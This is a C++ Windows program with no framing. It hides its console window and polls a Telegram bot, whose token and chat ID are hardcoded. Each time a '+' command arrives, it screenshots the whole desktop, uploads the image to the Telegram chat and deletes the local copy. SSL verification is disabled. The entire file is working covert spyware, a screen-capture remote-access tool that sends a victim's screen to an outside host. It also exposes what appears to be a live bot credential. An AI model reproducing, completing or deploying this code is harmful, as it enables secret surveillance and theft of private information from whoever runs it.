```cpp
#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <gdiplus.h>
#include <curl/curl.h>
#include <string>
#include <fstream>
#include <sstream>
#include <thread>
#include <chrono>
#include <vector>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "curl.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

using namespace Gdiplus;

const std::wstring BOT_TOKEN = L"8595906913:AAHZUutK5CGN0w0APtxlO76BX0fqwSp1Q48";
const std::wstring CHAT_ID   = L"8822946843";

std::string W2A(const std::wstring& w) {
    if (w.empty()) return "";
        int sz = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, NULL, 0, NULL, NULL);
            std::string s(sz - 1, 0);
                WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &s[0], sz, NULL, NULL);
                    return s;
                    }

                    bool MakeScreenshot(const std::wstring& path) {
                        int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
                            int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
                                int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
                                    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);

                                        HDC hScreen = GetDC(NULL);
                                            HDC hMem = CreateCompatibleDC(hScreen);
                                                HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
                                                    SelectObject(hMem, hBmp);
                                                        BitBlt(hMem, 0, 0, w, h, hScreen, x, y, SRCCOPY);

                                                            CLSID pngClsid;
                                                                CLSIDFromString(L"{557CF406-1A04-11D3-9A73-0000F81EF32E}", &pngClsid);

                                                                    Bitmap bmp(hBmp, NULL);
                                                                        bmp.Save(path.c_str(), &pngClsid, NULL);

                                                                            DeleteObject(hBmp);
                                                                                DeleteDC(hMem);
                                                                                    ReleaseDC(NULL, hScreen);
                                                                                        return true;
                                                                                        }

                                                                                        size_t WriteCB(char* ptr, size_t size, size_t nmemb, void* userdata) {
                                                                                            std::string* s = (std::string*)userdata;
                                                                                                s->append(ptr, size * nmemb);
                                                                                                    return size * nmemb;
                                                                                                    }

                                                                                                    std::string HttpGet(const std::string& url) {
                                                                                                        CURL* curl = curl_easy_init();
                                                                                                            std::string resp;
                                                                                                                if (curl) {
                                                                                                                        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
                                                                                                                                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCB);
                                                                                                                                        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp);
                                                                                                                                                curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
                                                                                                                                                        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
                                                                                                                                                                curl_easy_perform(curl);
                                                                                                                                                                        curl_easy_cleanup(curl);
                                                                                                                                                                            }
                                                                                                                                                                                return resp;
                                                                                                                                                                                }

                                                                                                                                                                                void SendPhoto(const std::wstring& filePath) {
                                                                                                                                                                                    CURL* curl = curl_easy_init();
                                                                                                                                                                                        if (!curl) return;
                                                                                                                                                                                            curl_mime* mime = curl_mime_init(curl);
                                                                                                                                                                                                curl_mimepart* part;

                                                                                                                                                                                                    part = curl_mime_addpart(mime);
                                                                                                                                                                                                        curl_mime_name(part, "chat_id");
                                                                                                                                                                                                            curl_mime_data(part, W2A(CHAT_ID).c_str(), CURL_ZERO_TERMINATED);

                                                                                                                                                                                                                part = curl_mime_addpart(mime);
                                                                                                                                                                                                                    curl_mime_name(part, "photo");
                                                                                                                                                                                                                        curl_mime_filedata(part, W2A(filePath).c_str());

                                                                                                                                                                                                                            std::string url = "https://api.telegram.org/bot" + W2A(BOT_TOKEN) + "/sendPhoto";
                                                                                                                                                                                                                                curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
                                                                                                                                                                                                                                    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
                                                                                                                                                                                                                                        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
                                                                                                                                                                                                                                            curl_easy_perform(curl);
                                                                                                                                                                                                                                                curl_mime_free(mime);
                                                                                                                                                                                                                                                    curl_easy_cleanup(curl);
                                                                                                                                                                                                                                                    }

                                                                                                                                                                                                                                                    int main() {
                                                                                                                                                                                                                                                        ShowWindow(GetConsoleWindow(), SW_HIDE);

                                                                                                                                                                                                                                                            GdiplusStartupInput gdiIn;
                                                                                                                                                                                                                                                                ULONG_PTR gdiToken;
                                                                                                                                                                                                                                                                    GdiplusStartup(&gdiToken, &gdiIn, NULL);
                                                                                                                                                                                                                                                                        curl_global_init(CURL_GLOBAL_ALL);

                                                                                                                                                                                                                                                                            long long offset = 0;
                                                                                                                                                                                                                                                                                std::wstring tempPath = L"C:\\Users\\Public\\screen.png";

                                                                                                                                                                                                                                                                                    while (true) {
                                                                                                                                                                                                                                                                                            std::string url = "https://api.telegram.org/bot" + W2A(BOT_TOKEN)
                                                                                                                                                                                                                                                                                                        + "/getUpdates?timeout=25&offset=" + std::to_string(offset);
                                                                                                                                                                                                                                                                                                                std::string resp = HttpGet(url);

                                                                                                                                                                                                                                                                                                                        size_t pos = 0;
                                                                                                                                                                                                                                                                                                                                while ((pos = resp.find("\"update_id\":", pos)) != std::string::npos) {
                                                                                                                                                                                                                                                                                                                                            pos += 12;
                                                                                                                                                                                                                                                                                                                                                        long long uid = std::stoll(resp.substr(pos));
                                                                                                                                                                                                                                                                                                                                                                    offset = uid + 1;
                                                                                                                                                                                                                                                                                                                                                                            }

                                                                                                                                                                                                                                                                                                                                                                                    if (resp.find("\"text\":\"+\"") != std::string::npos) {
                                                                                                                                                                                                                                                                                                                                                                                                MakeScreenshot(tempPath);
                                                                                                                                                                                                                                                                                                                                                                                                            SendPhoto(tempPath);
                                                                                                                                                                                                                                                                                                                                                                                                                        DeleteFileW(tempPath.c_str());
                                                                                                                                                                                                                                                                                                                                                                                                                                }

                                                                                                                                                                                                                                                                                                                                                                                                                                        std::this_thread::sleep_for(std::chrono::seconds(1));
                                                                                                                                                                                                                                                                                                                                                                                                                                            }

                                                                                                                                                                                                                                                                                                                                                                                                                                                curl_global_cleanup();
                                                                                                                                                                                                                                                                                                                                                                                                                                                    GdiplusShutdown(gdiToken);
                                                                                                                                                                                                                                                                                                                                                                                                                                                        return 0;
                                                                                                                                                                                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                                                                                                                                                                                        ```

                                                                                                                                                                                                                                                                                                                                                                                                                                                        ---
                                                                                                                                                                                                                                                                                                                                                                                                                                                        